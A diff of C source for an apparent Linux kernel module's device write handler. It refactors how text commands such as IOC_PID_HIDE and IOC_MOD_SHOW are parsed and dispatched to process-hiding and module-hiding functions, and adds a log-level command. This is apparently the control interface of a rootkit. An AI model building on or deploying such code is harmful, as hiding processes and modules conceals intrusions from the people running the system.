@@ -27,48 +27,6 @@
 #include "device/details/file_ops.h"
 #include "device/details/ioctl_cmd.h"
 
-static int parse_cmd(char* p_data, unsigned int* p_cmd, unsigned long* p_pid)
-{
-    if ((p_data[3] == '_') && (p_data[7] == '_')) {
-        p_data[3] = 0;
-        p_data[7] = 0;
-        p_data[11] = 0;
-    } else {
-        return -EFAULT;
-    }
-    if ((p_cmd == NULL) || (p_pid == NULL)) {
-        return -EFAULT;
-    }
-
-    if (strcmp(p_data, "IOC") != 0) {
-        return -EFAULT;
-    }
-
-    p_data += 4;
-    if (strcmp(p_data, "PID") == 0) {
-        *p_cmd = CROC_IOC_PID;
-    } else if (strcmp(p_data, "MOD") == 0) {
-        *p_cmd = CROC_IOC_MOD;
-    } else {
-        return -EFAULT;
-    }
-
-    p_data += 4;
-    if (strcmp(p_data, "HIDE") == 0) {
-        *p_cmd = *p_cmd | CROC_IOC_HIDE_CMD;
-    } else if (strcmp(p_data, "SHOW") == 0) {
-        *p_cmd = *p_cmd | CROC_IOC_SHOW_CMD;
-    } else {
-        return -EFAULT;
-    }
-
-    if (*p_cmd & CROC_IOC_PID) {
-        p_data += 5;
-        return kstrtoul(p_data, 10, p_pid);
-    }
-    return 0;
-}
-
 long dev_ioctl(struct file* p_file, unsigned int cmd, unsigned long arg)
 {
     rc_t err = 0;
@@ -171,17 +129,14 @@ ssize_t dev_write(struct file* p_file, const char __user* p_buf, size_t count, l
 
     char buffer[MAX_BUF_SIZE];
     module_dev_t* p_dev;
-    unsigned int cmd;
-    unsigned long pid;
-    int rc;
+    unsigned int cmd = 0;
+    unsigned long arg = 0;
+    int rc = 0;
 
     if ((count > MAX_BUF_SIZE - 1) || (count < 14)) {
         return -EFAULT;
     }
 
-    rc = 0;
-    cmd = 0;
-    pid = 0;
     memset(buffer, 0, MAX_BUF_SIZE);
 
     p_dev = p_file->private_data;
@@ -189,21 +144,23 @@ ssize_t dev_write(struct file* p_file, const char __user* p_buf, size_t count, l
 		return -EFAULT;
 	}
 
-    rc = parse_cmd(buffer, &cmd, &pid);
+    rc = ioc_parse_cmd(buffer, count, &cmd, &arg);
     if (rc != 0) {
         return rc;
     }
 
     if (cmd & CROC_IOC_PID) {
         if (cmd & CROC_IOC_HIDE_CMD) {
-            rc = ioc_hide_pid(p_dev, pid);
+            rc = ioc_hide_pid(p_dev, arg);
         } else if (cmd & CROC_IOC_SHOW_CMD) {
-            rc = ioc_show_pid(p_dev, pid);
+            rc = ioc_show_pid(p_dev, arg);
         } else {
             return -EFAULT;
         }
     } else if (cmd & CROC_IOC_MOD) {
         /* @todo    Implement */
+    } else if (cmd & CROC_IOC_LOG) {
+        SET_LOGF_LEVEL(arg);
     } else {
         return -EFAULT;
     }
